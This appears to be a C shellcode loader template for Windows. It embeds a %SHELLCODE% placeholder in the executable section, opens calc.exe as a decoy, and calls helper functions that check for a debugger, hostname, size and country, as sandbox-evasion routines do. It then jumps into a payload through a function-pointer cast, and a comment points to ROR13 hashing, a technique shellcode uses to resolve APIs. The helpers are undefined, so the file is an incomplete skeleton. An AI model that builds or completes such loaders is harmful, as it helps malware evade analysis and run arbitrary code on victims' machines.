#include <windows.h>
#include "config.h"
#include <stdio.h>

__attribute__((section(".text"))) %SHELLCODE%
void main() {
    ShellExecute(0, "open", "calc.exe", 0, 0, SW_SHOWNORMAL);
    int is_debugged = d();
    int size = z();
    char *hostname = h();
    char *country = c();
    
    printf("is_debugged: %d\n", is_debugged);
    printf("hostname: %s\n", hostname);
    printf("size: %d\n", size);
    printf("country: %s\n", country);

    ((void (*)())msgbox_payload)();
}

/*
https://asecuritysite.com/hash/ror13

*/